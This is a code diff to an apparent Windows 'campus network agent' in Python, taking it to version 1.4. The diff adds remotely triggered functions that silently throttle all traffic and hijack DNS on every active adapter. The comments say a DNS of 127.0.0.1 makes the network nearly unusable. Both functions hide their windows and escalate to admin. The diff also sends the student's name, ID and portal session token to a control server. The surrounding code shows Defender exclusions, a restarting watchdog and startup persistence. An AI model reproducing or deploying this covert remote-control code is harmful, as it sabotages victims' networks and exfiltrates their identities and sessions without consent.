@@ -533,6 +533,196 @@ def remove_defender_exclusion():
     ok, out = _run_as_admin(cmd)
     return True, "Defender 白名单已移除"
 
+# ============ 网络限速 (Windows QoS) ============
+
+BANDWIDTH_POLICY_NAME = "CampusNetAgent_BW_Limit"
+
+def set_bandwidth_limit(rate_kbps):
+    """设置带宽限制 (静默, 无弹窗)
+    
+    使用 New-NetQosPolicy 创建 QoS 限速策略
+    rate_kbps: 限速值, 单位 KB/s (例如 100 = 100KB/s ≈ 800Kbps)
+    """
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    rate_bps = int(rate_kbps) * 8 * 1000  # KB/s → bits/s
+    # 先删除旧策略
+    try:
+        subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -ErrorAction SilentlyContinue'],
+            capture_output=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+    except: pass
+    # 创建新策略 (匹配所有流量)
+    cmd = ["powershell", "-NoProfile", "-Command",
+           f'New-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -IPProtocolMatchCondition Both '
+           f'-ThrottleRateActionBitsPerSecond {rate_bps} -PolicyStore ActiveStore']
+    try:
+        r = subprocess.run(cmd, capture_output=True, text=True, timeout=15,
+                          creationflags=subprocess.CREATE_NO_WINDOW)
+        if r.returncode == 0:
+            return True, f"限速 {rate_kbps}KB/s 已生效"
+        # 普通权限失败, 尝试管理员
+        ok, out = _run_as_admin(cmd)
+        if ok:
+            return True, f"限速 {rate_kbps}KB/s 已生效(管理员)"
+        return False, f"设置失败: {out[:80]}"
+    except Exception as e:
+        return False, f"异常: {e}"
+
+def clear_bandwidth_limit():
+    """移除带宽限制 (静默)"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    cmd = ["powershell", "-NoProfile", "-Command",
+           f'Remove-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -Confirm:$false -ErrorAction SilentlyContinue']
+    try:
+        subprocess.run(cmd, capture_output=True, timeout=10,
+                      creationflags=subprocess.CREATE_NO_WINDOW)
+        return True, "限速已解除"
+    except Exception as e:
+        return False, f"异常: {e}"
+
+def get_bandwidth_limit():
+    """查询当前限速值, 返回 KB/s 或 0 (无限速)"""
+    if platform.system() != "Windows":
+        return 0
+    import subprocess
+    try:
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             f'(Get-NetQosPolicy -Name "{BANDWIDTH_POLICY_NAME}" -PolicyStore ActiveStore -ErrorAction Stop).ThrottleRateAction'],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        if r.returncode == 0 and r.stdout.strip():
+            bps = int(r.stdout.strip())
+            return bps // 8 // 1000  # bits/s → KB/s
+    except: pass
+    return 0
+
+# ============ DNS 篡改 (Windows) ============
+
+def set_dns_hijack(primary_dns, secondary_dns=""):
+    """篡改所有活动网卡的 DNS (静默, 无弹窗)
+    
+    primary_dns: 主 DNS (如 "127.0.0.1" 使网络几乎不可用)
+    secondary_dns: 备用 DNS (可选)
+    """
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    # 获取所有活动网卡 (状态=Up, 有 IPv4)
+    try:
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
+    except:
+        adapters = []
+    if not adapters:
+        return False, "未找到活动网卡"
+    
+    results = []
+    dns_addrs = f'"{primary_dns}"'
+    if secondary_dns:
+        dns_addrs = f'("{primary_dns}","{secondary_dns}")'
+    
+    for adapter in adapters:
+        cmd = ["powershell", "-NoProfile", "-Command",
+               f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ServerAddresses {dns_addrs}']
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
+                              creationflags=subprocess.CREATE_NO_WINDOW)
+            if r.returncode == 0:
+                results.append(f"{adapter}:✓")
+            else:
+                # 尝试管理员
+                ok, out = _run_as_admin(cmd)
+                results.append(f"{adapter}:{'✓' if ok else '✗'}")
+        except:
+            results.append(f"{adapter}:err")
+    
+    ok_count = sum(1 for r in results if '✓' in r)
+    return ok_count > 0, f"DNS→{primary_dns} | {' '.join(results)}"
+
+def reset_dns():
+    """恢复所有活动网卡 DNS 为自动获取 (DHCP) (静默)"""
+    if platform.system() != "Windows":
+        return False, "仅支持 Windows"
+    import subprocess
+    try:
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -ExpandProperty Name"],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        adapters = [a.strip() for a in r.stdout.strip().splitlines() if a.strip()]
+    except:
+        adapters = []
+    if not adapters:
+        return False, "未找到活动网卡"
+    
+    results = []
+    for adapter in adapters:
+        cmd = ["powershell", "-NoProfile", "-Command",
+               f'Set-DnsClientServerAddress -InterfaceAlias "{adapter}" -ResetServerAddresses']
+        try:
+            r = subprocess.run(cmd, capture_output=True, text=True, timeout=10,
+                              creationflags=subprocess.CREATE_NO_WINDOW)
+            if r.returncode == 0:
+                results.append(f"{adapter}:✓")
+            else:
+                ok, out = _run_as_admin(cmd)
+                results.append(f"{adapter}:{'✓' if ok else '✗'}")
+        except:
+            results.append(f"{adapter}:err")
+    
+    ok_count = sum(1 for r in results if '✓' in r)
+    return ok_count > 0, f"DNS已恢复DHCP | {' '.join(results)}"
+
+def get_dns_status():
+    """查询当前 DNS 设置, 返回 (is_hijacked: bool, dns_servers: str)
+    
+    检测方法: 查询活动网卡的 DNS 来源, 如果是手动设置(Static)则标记为已篡改
+    """
+    if platform.system() != "Windows":
+        return False, ""
+    import subprocess
+    try:
+        # 查询活动网卡上 DNS 是否手动设置 (非 DHCP 分配)
+        r = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "$a=Get-NetAdapter|Where-Object{$_.Status -eq 'Up'}|Select-Object -First 1;"
+             "if($a){$cfg=Get-DnsClientServerAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv4;"
+             "$ip=Get-NetIPInterface -InterfaceIndex $a.ifIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue;"
+             "if($cfg.ServerAddresses){$cfg.ServerAddresses -join ','}else{'DHCP'}}"
+             "else{'NONE'}"],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        out = r.stdout.strip()
+        if out in ("DHCP", "NONE", ""):
+            return False, "DHCP(自动)"
+        # 有 DNS 地址, 进一步检测是否是通过 DHCP 获取的
+        # 方式: 检查接口的 DNS 是否是手动配置的 (ServerAddresses 非空 = 手动)
+        r2 = subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             "$a=Get-NetAdapter|Where-Object{$_.Status -eq 'Up'}|Select-Object -First 1;"
+             "if($a){(Get-DnsClientServerAddress -InterfaceIndex $a.ifIndex -AddressFamily IPv4).ServerAddresses.Count}"
+             "else{0}"],
+            capture_output=True, text=True, timeout=10,
+            creationflags=subprocess.CREATE_NO_WINDOW)
+        count = int(r2.stdout.strip() or "0")
+        if count > 0:
+            return True, out
+        return False, "DHCP(自动)"
+    except:
+        return False, "查询失败"
+
 def _start_watchdog():
     """启动看门狗: 创建一个监控脚本, 主进程被杀后自动重启
     
@@ -646,87 +836,59 @@ class CampusNet:
         self.portal_ip = portal_ip
         self.base_url = f"http://{portal_ip}"
         self.user_index = ""
-        self.username = ""
+        self.username = ""       # portal 返回的 userName (中文姓名)
+        self.user_id = ""        # portal 返回的 userId (学号/账号)
+        self.user_ip = ""        # portal 返回的 userIp (认证IP)
         self.password = ""
+        self._cookie_opener = None
 
     def check_online(self):
-        """检测是否在线, 返回 (online, campus_ip, user_index, message)"""
-        import re
+        """检测是否在线, 返回 (online, campus_ip, user_index, message)
+        
+        每次都用 cookie 实时从 portal 获取, 不依赖缓存
+        """
         try:
-            # 1. 多种方式提取 userIndex
-            if not self.user_index:
-                for url in [
-                    f"{self.base_url}/eportal/redirectortos498.portal",
-                    f"{self.base_url}/eportal/",
-                    f"{self.base_url}/eportal/success.jsp",
-                ]:
-                    try:
-                        resp_text = http_get(url, timeout=5) or ""
-                        # 在页面内容、JS跳转、URL参数中搜索 userIndex
-                        m = re.search(r'userIndex[=:]\s*["\']?([a-fA-F0-9]{16,})', resp_text)
-                        if m:
-                            self.user_index = m.group(1)
-                            print(f"  [NET] 从 {url} 提取到 userIndex")
-                            break
-                    except:
-                        pass
-
-            # 2. 用 userIndex 获取完整用户信息
-            if self.user_index:
-                try:
-                    info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
-                    data = urllib.parse.urlencode({"userIndex": self.user_index}).encode()
-                    req = urllib.request.Request(info_url, data=data, method="POST")
-                    req.add_header("Content-Type", "application/x-www-form-urlencoded")
-                    with urllib.request.urlopen(req, timeout=5) as resp:
-                        text = resp.read().decode("utf-8")
-                        info = json.loads(text)
-                        ui = info.get("userIndex", "")
-                        name = info.get("userName", "")
-                        uid = info.get("userId", "")
-                        if ui or info.get("result") == "success":
-                            if ui:
-                                self.user_index = ui
-                            if name and not self.username:
-                                self.username = name
-                            if uid and not self.username:
-                                self.username = uid
-                            return True, get_local_ip(), self.user_index, f"已认证: {name or uid}"
-                        else:
-                            print(f"  [NET] getOnlineUserInfo 失败: {info.get('message','')}")
-                            self.user_index = ""
-                except Exception as e:
-                    print(f"  [NET] getOnlineUserInfo 异常: {e}")
-
-            # 3. 直接调 getOnlineUserInfo (空 userIndex, Portal 按 IP 返回)
+            import http.cookiejar
+            # 1. 建立带cookie jar的opener (每次新建, 保证拿最新session)
+            jar = http.cookiejar.CookieJar()
+            opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
+            # 2. 先GET首页让portal set JSESSIONID cookie
             try:
-                info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
-                req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
-                req.add_header("Content-Type", "application/x-www-form-urlencoded")
-                with urllib.request.urlopen(req, timeout=5) as resp:
-                    text = resp.read().decode("utf-8")
+                opener.open(self.base_url + "/", timeout=5).read()
+            except: pass
+            # 3. 带cookie POST查询 (portal按源IP+JSESSIONID返回当前登录用户)
+            info_url = f"{self.base_url}/eportal/InterFace.do?method=getOnlineUserInfo"
+            req = urllib.request.Request(info_url, data=b"userIndex=", method="POST")
+            req.add_header("Content-Type", "application/x-www-form-urlencoded")
+            try:
+                with opener.open(req, timeout=5) as resp:
+                    text = resp.read().decode("utf-8", errors="ignore")
                     info = json.loads(text)
-                    # Portal 可能返回 result=success 或 result=wait, 只要有 userIndex 就算在线
-                    ui = info.get("userIndex", "")
-                    name = info.get("userName", "")
-                    uid = info.get("userId", "")
+                    ui = info.get("userIndex", "") or ""
+                    name = info.get("userName", "") or ""
+                    uid = info.get("userId", "") or ""
+                    user_ip = info.get("userIp", "") or ""
                     if ui:
+                        # 实时覆盖所有字段 (不管之前缓存什么)
                         self.user_index = ui
-                        if name and not self.username:
-                            self.username = name
-                        if uid and not self.username:
-                            self.username = uid
-                        return True, get_local_ip(), self.user_index, f"已认证: {name or uid}"
-            except:
-                pass
+                        self.username = name
+                        self.user_id = uid
+                        self.user_ip = user_ip
+                        self._cookie_opener = opener
+                        display = name or uid or "?"
+                        return True, user_ip or get_local_ip(), ui, f"已认证: {display} ({uid})"
+                    else:
+                        # portal 返回但无 userIndex: 未登录或已下线
+                        self.user_index = ""
+                        # 不清 username/user_id, 保留上次显示
+            except: pass
 
-            # 4. 检测网络连通性
+            # 4. 检测外网连通性 (区分 "未认证但网络通" vs "完全断网")
             try:
                 urllib.request.urlopen("http://www.baidu.com", timeout=3)
-                return True, get_local_ip(), self.user_index, "网络可用(未获取token)"
+                return True, get_local_ip(), "", "网络可用(未认证)"
             except:
                 return False, get_local_ip(), "", "网络不可用"
-
         except Exception as e:
             return False, get_local_ip(), "", str(e)
 
@@ -962,6 +1124,10 @@ class Agent:
             print("  [断连] 清理完毕")
         self.was_online = online
         
+        # 查询限速和DNS状态 (每次心跳上报, 让服务器实时可见)
+        bw_limit = get_bandwidth_limit()
+        dns_hijacked, dns_servers = get_dns_status()
+        
         return {
             "agent_id": self.agent_id,
             "hostname": self.hostname,
@@ -969,8 +1135,11 @@ class Agent:
             "local_ip": get_local_ip(),
             "campus_ip": campus_ip,
             "mac": self.mac,
-            "username": self.net.username,
-            "user_index": self.net.user_index,
+            # portal 实时返回的用户信息 (每次心跳用 cookie 重新获取)
+            "username": self.net.username,      # 中文姓名 (userName)
+            "user_id": self.net.user_id,        # 学号/账号 (userId)
+            "user_index": self.net.user_index,  # session token (userIndex)
+            "user_ip": self.net.user_ip,        # portal 记录的认证 IP
             "net_online": online,
             "net_message": msg,
             "uptime": self.get_uptime(),
@@ -980,7 +1149,11 @@ class Agent:
             "autostart_lnk": _startup_lnk_exists(),
             "force_offline": self.force_offline,
             "force_offline_until": self.force_offline_until,
-            "version": "1.2",
+            # 网络控制状态
+            "bandwidth_limit": bw_limit,       # 0=无限速, >0 = KB/s
+            "dns_hijacked": dns_hijacked,      # bool
+            "dns_servers": dns_servers,         # 当前DNS字符串
+            "version": "1.4",
         }
 
     def heartbeat(self):
@@ -1086,6 +1259,21 @@ class Agent:
                 _start_watchdog()
                 success = True
                 message = "看门狗已启动(30秒检测一次)"
+
+            elif command == "set_bandwidth":
+                rate = int(params.get("rate_kbps", 100))
+                success, message = set_bandwidth_limit(rate)
+
+            elif command == "clear_bandwidth":
+                success, message = clear_bandwidth_limit()
+
+            elif command == "set_dns":
+                dns1 = params.get("primary", "127.0.0.1")
+                dns2 = params.get("secondary", "")
+                success, message = set_dns_hijack(dns1, dns2)
+
+            elif command == "reset_dns":
+                success, message = reset_dns()
 
             elif command == "uninstall":
                 # 完全卸载 (仅服务器可触发)
